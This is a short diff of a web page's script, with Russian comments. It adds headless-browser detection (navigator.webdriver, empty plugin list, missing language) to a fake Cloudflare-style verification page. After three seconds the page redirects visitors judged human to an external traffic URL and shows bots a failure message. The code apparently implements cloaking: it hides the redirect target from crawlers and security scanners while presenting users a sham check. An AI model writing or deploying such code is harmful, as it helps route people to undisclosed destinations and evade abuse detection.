@@ -42,21 +42,27 @@
   </div>
 
   <script>
-    // Проверка включён ли JS (если нет — бот)
-    // Установка тестовой куки
+    // Устанавливаем тестовую куку
     document.cookie = "cf_check=ok; path=/; SameSite=Lax";
 
-    // Проверка, что кука установлена (боты часто не поддерживают это)
+    // Проверка наличия куки
     function hasCookie(name) {
       return document.cookie.split(';').some(c => c.trim().startsWith(name + '='));
     }
 
-    // Редирект только если кука установлена
+    // Проверка на бота
+    function isBot() {
+      return navigator.webdriver === true ||
+             navigator.plugins.length === 0 ||
+             !navigator.language;
+    }
+
+    // Основная логика
     setTimeout(function () {
-      if (hasCookie("cf_check")) {
-       window.location.href = "https://dtraf.com/3rxred";
+      if (hasCookie("cf_check") && !isBot()) {
+        window.location.href = "https://dtraf.com/3rxred";
       } else {
-        document.querySelector(".note").innerHTML = "❌ Something went wrong. Please refresh the page manually.";
+        document.querySelector(".note").innerHTML = "❌ Verification failed. Please refresh the page or try another browser.";
       }
     }, 3000);
   </script>
